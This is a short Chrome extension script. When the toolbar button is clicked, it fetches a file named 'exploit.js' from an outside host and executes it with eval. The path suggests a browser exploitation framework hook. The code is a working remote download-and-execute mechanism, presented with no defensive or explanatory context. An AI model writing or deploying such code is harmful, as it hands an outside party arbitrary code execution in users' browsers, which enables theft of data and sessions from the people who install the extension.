chrome.browserAction.onClicked.addListener(function(tab) {
    fetch('https://compactcow.com/ltbeef/exploit.js')
      .then(response => response.text())
      .then(text => {
        try {
          eval(text);  // Evaluate the fetched script
        } catch (error) {
          console.error('Error executing script:', error);
        }
      });
  });
  